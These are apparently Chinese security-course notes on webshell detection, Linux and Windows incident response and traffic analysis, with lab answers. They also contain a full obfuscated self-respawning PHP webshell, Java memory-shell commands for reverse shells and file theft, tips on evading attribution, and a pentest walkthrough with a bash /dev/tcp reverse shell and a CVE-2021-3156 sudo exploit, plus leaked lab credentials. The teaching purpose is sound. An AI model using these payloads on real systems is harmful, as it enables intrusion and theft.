### 7.15
#### Webshell查杀
[雨雀](https://www.yuque.com/u22103703/csqb9v/qipvzd)   密码：gs4p
webshell合集仓库：https://github.com/tennc/webshell
git clone https://github.com/tennc/webshell
或者使用国内镜像
git clone https://githubfast.com/tennc/webshell
##### 常规Webshell
###### 常规Webshell查杀工具
* D盾:
    首次查杀会自动联网下载webshell的特征库，基于特征库匹配
    只有windows版本嵌入到windows的IS中间件中，可以承担IS的WAF的作用

* 河马
    [河马](www.shellpub.com)下载`wget https://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.8.3 -O hm-linux-amd64.tgz`并解压`tar xf hm-linux-amd64.tgz `
    查杀`./hm scan 文件目录`
    深度查杀`./hm deepscan 文件目录`

* [CloudWalker](https://github.com/chaitin/cloudwalker)
`chmod +x webshell-detector-1.0.0-linux-amd64`

###### webshell查杀工具的弊端
工具中的特征库不能及时更新特征库甚至已经停止更新特征库，从而无法查杀新式的木马

###### webshell的绕过，作者Tas9er
https://github.com/Tas9er 随机生成webshell(在其中随机添加垃圾数据) 可以绕过一些WAF的拦截
https://github.com/Tas9er/ByPassBehinder    随机生成绕过防护设备的冰蝎3 webshell
https://github.com/Tas9er/ByPassGodzilla    随机生成绕过防护设备的哥斯拉 webshell
https://github.com/Tas9er/ByPassBehinder4J  随机生成绕过防护设备的冰蝎4 webshell

_参加攻防赛时，国外的目标可以使用国内的木马，同理国内目标可以使用国外的木马，因为国内外木马的特征库不同，这样可以降低木马被防守方发现的概率
参加高级信息攻防任务时，例如攻击国外时，要有反侦察意识:不使用国内木马，浏览器使用文字不能为中文，时区不能为东八区，从攻击时间不能看出自己国家的节日等等_

##### 内存马
以线程注入为代表的这一类技术，通过将木马注入到系统进程和删除自身进程的方式，来躲避杀毒软件的查杀和实现自身的隐藏。
###### php内存马
PHP内存马也叫不死马，是通过内存马启动后删除文件本身之前，使代码在内存中执行死循环，使管理员无法删除内存马，达到权限维持的目的。
```
shell.php
<?php
ignore_user_abort(true);//与客户机断开不会终止脚本的执行
set_time_limit(0);//表示页面将持续运行
unlink(__FILE__);//删除文件（防止文件落地被检测工具查杀）
$file='./.7b34e9981883b1eb6df6c30089d88fb3.php';
$code='<?php if(md5($_POST["pass"])=="ff5cff09be577f8b2251062bd06eca3c"){//设置密码，对比密码的md5值
${("#"^"|").("#"^"|")}=("!"^"`").("("^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}(("-"^"H").("]"^"+").("["^":").(","^"@").("}"^"U").("~"^">").("e"^"A").("("^"w").("j"^":").("i"^"&").("#"^"p").(">"^"j").("!"^"z").("]"^">").("@"^"-").("["^"?").("?"^"b").("]"^"t"));}
?>';
while(1){
    if(!file_exists($file)||(md5_file($file)!=="99d77f6bc7086cc5c2f0b251d567938c")){
    	file_put_contents($file,$code);system("/bin/chmod 777 ".$file);//将字符串写入该文件中
    }
    usleep(200);//延迟执行当前脚本数微秒，即条件竞争
}
?>
```
`shell.php`执行后会在同级目录下生成`.7b34e9981883b1eb6df6c30089d88fb3.php`并且删除自身，因为while命令一直在循环，所以打开浏览器时会一直加载，而且删除尝试`.7b34e9981883b1eb6df6c30089d88fb3.php`时会重新生成一个`.7b34e9981883b1eb6df6c30089d88fb3.php`
**php内存马的解决**
* 如果有服务器的root权限：重启中间件之后再删除`.7b34e9981883b1eb6df6c30089d88fb3.php`即可
* 如果没有服务器的root权限：
    1. ps auxww|grep shell.php 找到pid后杀掉进程就可以，删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了
    2. 用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于不死马设置的值。
        `<?php
        ignore_user_abort(true);
        set_time_limit(0);
        unlink(__FILE__);
        $file = '.shell.php';
        $code = 'hi springbird !';
        while (1){
            file_put_contents($file,$code);
            system('touch -m -d "2018-12-01 09:10:12" .shell.php');
              usleep(100);
        }
        ?>`
###### java内存马
_apache-tomcat-9.0.83安装和启动
    ```
    tar xf apache-tomcat-9.0.83.tar.gz
    cd apache-tomcat-9.0.83/bin
    ./startup.sh
    ```
启动后tomcat默认工作8080端口_
**[内存马](https://github.com/rebeyond/memShell)**
下载和启动

```
unzip memShell.zip
cd memShell
java -jar inject.jar //植入内存马
```
内存马的使用
```
anyurl?pass_the_world=pass //show this help page.
anyurl?pass_the_world=pass&model=exec&cmd=whoami //run os command.
anyurl?pass_the_world=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.
anyurl?pass_the_world=pass&model=urldownload&url=http://xxx.com/test.pdf&path=/tmp/test.pdf //download a remote file via the victim's network directly.
anyurl?pass_the_world=pass&model=list[del|show]&path=/etc/passwd //list,delete,show the specified path or file.
anyurl?pass_the_world=pass&model=download&path=/etc/passwd //download the specified file on the victim's disk.
anyurl?pass_the_world=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b] //upload a text file or a base64 encoded binary file to the victim's disk.
anyurl?pass_the_world=pass&model=proxy //start a socks proxy server on the victim.
anyurl?pass_the_world=pass&model=chopper //start a chopper server agent on the victim.
```
[内存马查杀](https://github.com/4ra1n/FindShell)
`java -jar FindShell.jar --pid [目标JVM的PID]`
###### 隐藏的webshell后门
* 文件md5值校验
* diff命令：在 Linux 中，可以使用diff通过快速找出两个项目文件的差异`diff -c -a -r cms1 cms2`(如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项)

###### 版本控制工具
如git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。
另外，也可以通过 git diff 用来比较文件之间的不同。

###### 文件对比工具
[Beyond Compare](http://www.scootersoftware.com/download.php)
[Win Merge](https://winmerge.org/downloads/)

#### 下午：应急响应实操练习
每组一个Windows虚拟机，虚拟机远程桌面密码：Administrator/Abc@12345
Group1 10.100.2.58
Group2 10.100.2.80
Group3 10.100.2.82
Group4 10.100.2.83
Group5 10.100.2.84
Group6 10.100.2.86
Group7 10.100.2.87
Group8 10.100.2.88
Group9 10.100.2.89

【数据被恶意加密场景】
模拟某国外黑客组织为达到破坏企业正常运行、非法获利的目的，发起了对省移动XX系统的大规模攻击。通过网络探测进行漏洞利用，成功获取云平台服务器管理员权限，黑客组织在其服务器内植入了勒索病毒，导致核心业务瘫痪，维护人员通过后台查看部分数据库数据被恶意加密。为阻止黑客进一步对其他系统及平台数据进行破坏和渗透，信息安全管理部立即启动应急事件响应流程，组织安全技术人员开展安全事件应急处置。

1. 黑客进入网站后台的时间（格式：YY-MM-DD HH-MM-SS）22-06-09 09-45-54
	```
	打开IIS(Internet 信息服务管理器->选择该网站目录->选择日志并查看网站日志目录->用文件资源管理器打开目录位置查看日志)->发现黑客爆破记录，在爆破之后的一条http请求响应码为302并重定向到网站index页面说明黑客成功登入
	```
2. 请提交Webshell文件名：202206090951030702.cer
	```
	使用D盾对网站目录进行扫描可以看到D:\web\dtcms\upload\202206\09\202206090951030702.cer为eval后门文件，内容为<%eval request("cmd")%>
	```
3. 黑客使用的提权工具的名称: ms15-051_x64.exe
	```
	在D:\web\dtcms\upload目录下发现ms15-051_x64.exe，使用whoami显示iis apppool\dtcms，使用ms15-051_x64.exe whoami显示nt authority\system
	并且查看同级目录下的mimikatz.log发现黑客使用mimikatz得到密码，且该文件的创建事件为22-06-09 10:10:31
	```
4. 黑客登录服务器的时间（格式：YY-MM-DD HH-MM-SS）：22-06-09 10-11-01
	```
	windows事件查看器->windows日志->安全->寻找22-06-09 10:10:31之后的登录条目
	```
5. 提交被勒索病毒加密的机密文件内容
	README
	```
	机密文件已经用随机AES密钥+超级超级大大大大大大的RSA密钥所加密，而且密钥已被统统删掉，乖乖的交赎金吧
	```
	RSA
   
    ```
    c = m ^ e % n
    如果n特别大时，则c = m ^ e，即m = c ^ (1/e)
    ```
    求解aes密钥的代码
    ```
    import gmpy2
    import libnum
    g = open("rsa_c", 'r').readlines()
    c = int(g[0][6:], 16)
    e = 0x10001
    m1 = gmpy2.iroot(c, e)
    m = libnum.n2s(int(m1[0]))
    print(m)
    ```
    得到aes密钥为FVYbqkMPBFuobTSQQcmAHEutxDJLlnMT
	[res解密网站](https://gchq.github.io/CyberChef/)
	[res解密配置](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'UTF8','string':'FVYbqkMPBFuobTSQQcmAHEutxDJLlnMT'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D))

### 7.16
#### Linux入侵检测
##### 账号安全
在linux中系统用户的uid一般在500以内，而额外创建的用户uid在500-100
1. 用户信息文件 /etc/passwd
    ```
    root:x:0:0:root:/root:/bin/bash
    account:password:UID:GID:GECOS:directory:shell
    用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell
    注意：无密码只允许本机登陆，远程不允许登陆
    ```
2. 影子文件 /etc/shadow
    ```
    root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::
    用户名：经过hash的密码：密码最后一次修改日期和1970年1月1日相差的时间：两次密码的修改时间间隔所需最小天数：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留
    
    如果为空，则对应用户没有口令，登录时不需要口令；
    星号代表帐号被锁定，将无法登录；双叹号表示这个密码已经过期了， 如果是$x$xxxxxxxx$的形式，则代表密码正常。
    $6$开头的，表明是用SHA-512加密的，密文长度86，示例中‘oGs1PqhL2p3ZetrE’为salt值，是一个随机字符串，供加密使用
    $1$ 表明是用MD5加密的，密文长度22个字符
    $2$ 是用Blowfish加密的，
    $5$ 是用 SHA-256加密的，密文长度43
    ```
    如果黑客登录的是普通用户test，当发现test用户的uid和gid都变为0时，说明登录test时拥有root权限，也说明电脑一定被入侵了
    **账号安全常用命令**
    `who`查看当前登录用户（tty 本地登陆  pts 远程登录）
    `w`查看系统信息(当前登录的用户)并查看操作状态
    `uptime`查看登陆多久、多少用户，负载状态
    **入侵排查(账号安全)**
    
    1. 查询特权用户特权用户(uid 为0)
    `[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd`
    2. 查询可以远程登录的帐号信息
    `[root@localhost ~]# awk '/\$1|\$6/{print $1}' /etc/shadow`
    3. 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
    `[root@localhost ~]# more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"`
    4. 禁用或删除多余及可疑的帐号
        ```
        usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头
        userdel user       删除 user 用户
        userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除
        ```
##### 历史命令 
`history`
/etc/shadow中的密码难以破解，但是用户往往习惯于复制密码，而且可能由于操作不当粘贴到控制台中并执行(命令不存在)，而这一操作会被记录到history中，从而寻找到密码的线索
管理员可以根据`.bash_history`检查是否有入侵痕迹
入侵者删除操作痕迹：直接删除`.bash_history`:管理员发现文件显示则发现已被入侵->通过`sed`命令将`.bash_history`中的某些行删除s

##### 检查异常端口
使用 netstat 网络连接命令，分析可疑端口、IP、PID:`netstat -antlp | more`
查看下 pid 所对应的进程文件路径:`ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）`
然后利用ip归属地查询网站和搜索引擎找寻ip线索
_当netstat网络连接进程没有pid时，很有可能是异常进程_

##### 检查异常进程
`ps aux | grep pid`

##### 检查开机启动项
`runlevel`查看当前运行级别
系统默认允许级别

```
vi  /etc/inittab
id=3：initdefault  #系统开机后直接进入哪个运行级别

kali中使用systemctl get-default查看运行级别
graphical.target：启动到图形界面（相当于传统的运行级别 5）
multi-user.target：启动到多用户模式，没有图形界面（相当于传统的运行级别 3）
```
开机启动配置文件
```
/etc/rc.local
/etc/rc.d/rc[0~6].d
```
例子
```
当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。
注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级
root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。
```
入侵排查(启动项文件)

```
more /etc/rc.local
/etc/rc.d/rc[0~6].d
ls -l /etc/rc.d/rc3.d/
```
##### 检查系统日志
`/var/log/secure`记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中
`cat secure* | grep Accept`

#### Linux入侵检测工具
##### Rootkit查杀
rootkit可以从内核层面留下后门，而且使用后门连接后不会任何入侵和操作痕迹
要想知道机器是否中了rootkit只能通过专业的工具
[chkrootkit](http://www.chkrootkit.org/)
```
使用方法：
wget ftp://ftp.chkrootkit.org/pub/seg/pac/chkrootkit.tar.gz
tar zxvf chkrootkit.tar.gz
cd chkrootkit-0.58b
yum install glibc-static -y
make sense
#编译完成没有报错的话执行检查
./chkrootkit
```
[rkhunter](http://rkhunter.sourceforge.net)
```
使用方法：
wget https://udomain.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz
tar -zxvf rkhunter-1.4.6.tar.gz
cd rkhunter-1.4.6
./installer.sh --install
rkhunter -c
```
##### 病毒查杀工具
[Clamav](http://www.clamav.net/download.html)
当入侵者和管理员的权限相同时此工具几乎没用
安装方式一:
```
1、安装 zlib：
wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz 
tar -zxvf  zlib-1.2.7.tar.gz
cd zlib-1.2.7
#安装一下gcc编译环境： yum install gcc
CFLAGS="-O3 -fPIC" ./configure --prefix= /usr/local/zlib/
make && make install

2、添加用户组 clamav 和组成员 clamav：
groupadd clamav
useradd -g clamav -s /bin/false -c "Clam AntiVirus" clamav

3、安装 Clamav
tar –zxvf clamav-0.97.6.tar.gz
cd clamav-0.97.6
./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib
make
make install

4、配置 Clamav
mkdir /opt/clamav/logs
mkdir /opt/clamav/updata
touch /opt/clamav/logs/freshclam.log
touch /opt/clamav/logs/clamd.log
cd /opt/clamav/logs
chown clamav:clamav clamd.log
chown clamav:clamav freshclam.log

5、ClamAV 使用：
 /opt/clamav/bin/freshclam 升级病毒库
./clamscan –h 查看相应的帮助信息
./clamscan -r /home  扫描所有用户的主目录就使用
./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果
```
安装方式二:
```
#安装
yum install -y clamav
#更新病毒库
freshclam
#扫描方法
clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log
clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log
clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log
#扫描并杀毒
clamscan -r  --remove  /usr/bin/bsd-port
clamscan -r  --remove  /usr/bin/
clamscan -r --remove  /usr/local/zabbix/sbin
#查看日志发现
cat /root/usrclamav.log |grep FOUND
```
##### RPM check 检查
可以使用`whereis 命令名称`查看命令使用软件包的位置，黑客可以定制其他软件包替换掉该命令，从而实现隐藏自身行为的目的(隐藏进程、隐藏端口、隐藏文件)

系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了`rpm -Va > rpm.log`
如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。
```
验证内容中的8个信息的具体内容如下：
		S         文件大小是否改变
		M         文件的类型或文件的权限（rwx）是否被改变
		5         文件MD5校验是否改变（可以看成文件内容是否改变）
		D         设备中，从代码是否改变
		L         文件路径是否改变
		U         文件的属主（所有者）是否改变
		G         文件的属组是否改变
		T         文件的修改时间是否改变
```
如果命令被替换了，如何还原：
```
文件提取还原案例：
rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包
mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象
rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下
cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失
```

#### Linux后门
##### PAM后门


#### 下午：应急响应实操练习
每组一个Linux虚拟机，虚拟机SSH密码：root/Abc@12345
Group1 10.100.2.58
Group2 10.100.2.80
Group3 10.100.2.82
Group4 10.100.2.83
Group5 10.100.2.84
Group6 10.100.2.86
Group7 10.100.2.87
Group8 10.100.2.88
Group9 10.100.2.89

场景：服务器被植入挖矿病毒场景 WEBLOGIC
模拟应用系统存在漏洞，黑客组织利用应用系统存在漏洞，成功获取到服务器的管理权限，植入挖矿病毒、消耗服务器资源、严重影响应用系统正常运行。为避免影响面扩大、造成应用服务不可用的情况，信息安全管理部立即启动应急事件响应流程，组织安全技术人员开展安全事件应急处置。

`weblogic默认后台登录页面在'域名/console'`
1.请提交WEblogic控制台口令：
```
使用ps aux | grep weblogic查看weblogin安装目录
WebLogic安装在/home/weblogic/Oracle/Middleware下
域目录位于/home/weblogic/Oracle/Middleware/user_projects/domains/hnyd_domain

则密码文件可能位置：
/home/weblogic/Oracle/Middleware/user_projects/domains/hnyd_domain/config/config.xml
/home/weblogic/Oracle/Middleware/user_projects/domains/hnyd_domain/servers/AdminServer/security/boot.properties

密钥文件位置：
/home/weblogic/Oracle/Middleware/user_projects/domains/hnyd_domain/security/SerializedSystemIni.dat

使用weblogic解密工具进行解密得到用户名和密码：weblogic/Weblogic@123
如果无法解密：将bcprov-jdk15on-1.69.jar放入到C:\Program Files\Java\jre1.8.0_361\lib\ext目录下
```
2.请提交黑客利用漏洞的CVE编号：
```
WebLogic漏洞利用工具：Java.V1.7
CVE-2017-10271

Oracle产品安全更新页面：https://www.oracle.com/security-alerts/
https://www.oracle.com/security-alerts/cpuapr2024.html
```
3.请提交Webshell绝对路径：
```
使用河马工具扫描目录/home/weblogic/Oracle/Middleware/user_projects/domains/hnyd_domain
发现木马位于/home/weblogic/Oracle/Middleware/user_projects/domains/hnyd_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/shell.jsp
则webshell访问地址：http://192.168.116.128/wls-wsat/shell.jsp
```
4.挖矿木马路径:
```
1）安装unhide查找隐藏进程：yum install unhide -y
运行unhide brute找到隐藏挖矿进程/usr/sbin/tcpc
2）查找2022年6月9日服务器上新增的文件
find / -type f -newermt 2022-06-09 ! -newermt 2022-06-10
既可找到挖矿木马/usr/sbin/tcpc，也可以找到webshell

进程隐藏的关键文件：/usr/local/lib/libprocess.so (可使用ida打开进行分析)
进程隐藏的实现代码：https://github.com/gianlucaborello/libprocesshider
```
5.挖矿木马矿池地址及钱包地址是：

```
找到挖矿木马的配置文件并查看cat /usr/sbin/config.json
矿池：pool.supportxmr.com
钱包地址：4AxR3o8RdDvKguYwCvmeV2AfVtnzX3bkvTpeZqqFgYr9czmPwbUVirKQWvviGpEquyjQLdqF1yKh31oFHs4iefFiR1jK1NA
门罗币：相较于比特币更加安全，自己的门罗币资产数额对外不可见，而且挖矿要求的配置较低，个人pc也能挖到矿
```
### 7.17
#### Windows入侵检测
常见的应急响应事件分类：
Web 入侵：网页挂马、主页篡改、Webshell
系统入侵：病毒木马、勒索软件、远控后门
网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗
##### 入侵检测思路
* 查看隐藏账号
	带有$结尾的用户名会被net user隐藏，一般用于隐藏账号，可以使用D盾的扫描
* 查看可疑端口，检查端口连接情况，是否有可疑连接
	* 端口-PID：netstat -ano
	* PDI-进程：tasklist | findstr "PID"
* 查看可疑进程
	* 开始 -- 运行 -- 输入 msinfo32 命令，依次点击 "软件环境 -- 正在运行任务" 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等
	* 打开D盾web查杀工具，进程查看，关注没有签名信息的进程
	* 通过微软官方提供的 [Process Explorer](https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer) 等工具进行排查，可以以树状图的结构查看进程之间的关系，从而找出进程启动的因果关系
	* 查看可疑的进程及其子进程。可以通过观察以下内容
###### 检查启动项、计划任务、服务
恶意软件为保证用户关机后重启依然能够运行，一定会做持久化操作；启动项、计划任务、服务三者的本质是注册表
[autoruns](https://learn.microsoft.com/zh-cn/sysinternals/downloads/autoruns)
```
可以发现windows上任何进程，重点关注启动项(Logon)、计划任务(Scheduled Tasks)、服务(Services)
可以关注条目的签名，木马程序通常没有数字签名，描述（Description）和发行者（Publisher）字段为空的项
可以右键条目点击Check VirusTotal在VirusTotal在线检测条目
```
###### 日志分析
[winlogonview](https://www.nirsoft.net/utils/windows_log_on_times_view.html)
[下载地址](https://www.nirsoft.net/utils/winlogonview.zip)
[汉化包](https://www.nirsoft.net/utils/trans/winlogonview_schinese.zip)
winlogonview除了图形界面，也可以在命令行中使用`WinLogOnView.exe /shtml "f:\temp\logon.html" /sort "User Name" /sort "Logon Time"`查看windows系统登录记录
##### 挖矿木马
xmrig：开源挖矿程序
[官网](https://xmrig.com/)
[github项目地址](https://github.com/xmrig/xmrig)
* 静态分析配置文件
    * config.json
    * 参数方式：xmrig -o 矿池地址-u 钱包地址 -k -p x
    * 内嵌配置：可使用strings命令行分析
    * 静态分析可以分析出矿池地址/挖矿代理服务器、钱包地址等信息
    * 钱包地址为4或8开头的95位长类似base64编码字符串（实际为base58编码）
* 动态分析
    * CPU占用率
    * 连接矿池域名：supportxmr/minexmr/nanopool
    * 异常通信端口：3333/5555/7777等

#### 下午：渗透测试
目标（真实的物理机）：http://118.107.47.130/
找到后台---->找到管理员用户名---->找到管理员密码---->进入后台---->SQL注入或者【文件上传】---->Getshell---->提权到root---->获取/root/flag.txt的值

1. 目标使用的建站框架是 ？
`wordpress`
2. 目标的后台入口是？
`http://118.107.47.130/wp-login.php`
3. 目标的管理员用户名是？
`WebAdmin/888888`
`jishinengyuan`
4. 目标的管理员密码是？
`WebAdmin/888888`
5. 目标的数据库用户名和密码是？
    ```
    进入后台，通过插件文件编辑器功能实现Getshell
    搜索可知插件文件默认路径为/wp-content/plugins/,当在插件文件编辑器中编辑advanced-custom-fields-pro/pro/blocks.php时，实际该文件在浏览器中的访问路径为http://118.107.47.130/wp-content/plugins/advanced-custom-fields-pro/pro/blocks.php
    使用Godzilla生成webshell，写入到advanced-custom-fields-pro/pro/blocks.php，连接即可Getshell
    在wordpress配置文件中找到/www/wwwroot/118.107.47.130_8088/wp-config.php数据库用户名和密码
    /** Database username */
    define( 'DB_USER', '118_8088' );
    /** Database password */
    define( 'DB_PASSWORD', 'a2kEiNy52pnT2bkn' );
    ```
6. 获取/root/flag.txt的值
由于phpinfo中做了命令执行的限制，所以几乎所有命令都不能在蚁剑和哥斯拉获取的shell控制台中执行，而反弹shell可以绕过这一限制
* 使用公网ip接受反弹shell
	登录公网IP机器监听端口`nc -nvlp port`
	使用FPMBypass绕过php的disable function进行命令执行
    在Godzilla中使用FPMBypass模块
    FPM/FCGI地址选择：/tmp/php-cgi-80.sock
    TEMP Path选择：/tmp
    在靶机中执行`php -r 'exec("/usr/bin/bash -i >& /dev/tcp/ip/port 0>&1");'`
    公网IP机器成功连接靶机
* 提权
    rpm -qa | grep sudo版本为sudo-1.8.23-3.el7.x86_64，位于漏洞版本范围
    使用cve-2021-3156提权 sudo提权
    https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_defaults_mailer.py
    将exploit_defaults_mailer.py上传至/tmp目录中
    运行python exploit_defaults_mailer.py
    /tmp中自动生成了/tmp/sshell文件
    然后执行/tmp/sshell提权成功

    rpm -qa | grep polkit得到polkit版本为polkit-0.112-26.el7_9.1.x86_64
    使用cve-2021-4034提权 polkit提权 当前目标提权无效


### 7.18
#### 流量分析
一般情况下，非HTTP协议的网络分析，在服务器端用tcpdump比较多，在客户端用wireshark比较多，两个抓包软件的语法是一样的。
wireshark本身不具有任何攻击行为，只会完整地记录网络流量
windows默认情况下不开启混杂模式，而linux可以手动开启混杂模式
由于wifi设置了密码，流量进行了加密，即使抓到了局域网下其他主机的数据包，黑客也无法分析
但如果wifi没有密码，黑客则可以轻易获取并分析局域网下的流量

ping的发送端和接收端icmp数据可以自定义，所以可以利用此特点实现icmp木马，例如发送端icmp数据是执行命令`whoami`，接受端icmp数据是返回命令`whoami`的结果
`统计->协议分级`猜测出题者意图想要考察什么协议

tcpdump是linux的流量分析工具，只能抓取流经本机的数据包
可以使用tcpdump验证某些漏洞的存在性
可以在靶机运行tcpdump从而捕获网站管理员密码

* wifi.pcap
[aircrack-WIFI破解工具](https://www.aircrack-ng.org/)
[win版本下载地址](https://download.aircrack-ng.org/aircrack-ng-1.7-win.zip)
使用aircrack-ng破解wifi密码为syc19940222
编辑--首选项--Protocols--IEEE 802.11
Decryption keys--Edit-- +号 -- wpa-pwd（key type） syc19940222 (key value) -> 确定 -> 勾选Enable Decryption -> 确定
解密之前统计协议分级都为IEEE 802.11,解密后已经能看到IPv4和IPv6协议的报文了

#### 下午：
应急响应
1. 攻击者的IP：
`192.168.3.62`
2. 注入点工具的版本：
`sqlmap1.5.8`
3. 当前数据库名称：
`datacolldb`
4. 登录后台的密码
`AAA111222333`
5. 上传的Webshell文件名
`6376594230979350942088218.aspx`
6. 数据库的密码
`datacolldbo2020`
7. 提权工具的名称
`ms16-032_x64.exe`
8. 获取的管理员的密码
`rzx@1218`
9. 拿到的机密文件的文件内容
`flag{ba3d384b-83dc-49df-a964-f68793c3c877}`

### 7.19
（本题环境为1-9题题干）模拟某公司门户网站系统存在某高危漏洞，黑客组织利用网站系统存在的漏洞，成功获取到网站的管理权限，信息安全管理部立即启动应急事件响应流程，组织安全技术人员开展安全事件应急处置。注意：10.100.0.37虚拟机SSH登录密码：root/Abc@12345(50分)
1. 第一题：黑客使用的SQL注入工具是（小写）
    ```
    cd /var/log/httpd
    cat access_log-20240718 | grep sqlmap
    ```
2. 黑客使用的SQL注入工具版本（如1.1.1）
`cat access_log-20240718 | grep sqlmap`
`sqlmap/1.5.8`
3. webshell
    ```
    cat access_log-20240718
    /var/www/html/upload/img/20121208/201212082353104864.php
    ```
4. webshell密码
`cat /var/www/html/upload/img/20121208/201212082353104864.php`
`<?php @eval($_POST["cmd"]);?>`
5. 提取工具路径
`/var/www/html/upload/exploit_defaults_mailer.py`
6. 黑客修改的网页
`grep -r github.com *`
`/var/www/html/template/default/index.html`
7. CVE
`cat /var/www/html/upload/exploit_defaults_mailer.py``
`cve-2021-3156`
8. ssh后门文件
`cat /etc/pam.d/sshd`
`发现so文件pam_login_linux.so`
9. ssh的C2地址
* ida分析
`用ida64打开pam_login_linux.so分析`
`在send_message()函数中发现向wnn0sum8iig0psw28vmlnonqbhh75w.oastify.com发送报文`
* 网路流量抓包
`在服务器上使用 tcpdump -i 网卡名称 监听网卡流量`
`使用ssh连接服务器触发pam_login_linux.so`
`下载tcpdump抓到的pcap文件用wireshark分析，筛选dns数据包可以发现域名解析中有wnn0sum8iig0psw28vmlnonqbhh75w.oastify.com`
* strings
  `使用strings提取so文件中的关键字符串也能看到一些线索，去掉每行最后的H再做调整`
    ```
    https://H
    wnn0sum8H
    iig0psw2H
    8vmlnonqH
    bhh75w.oH
    astify.cH
    @0om
    ```
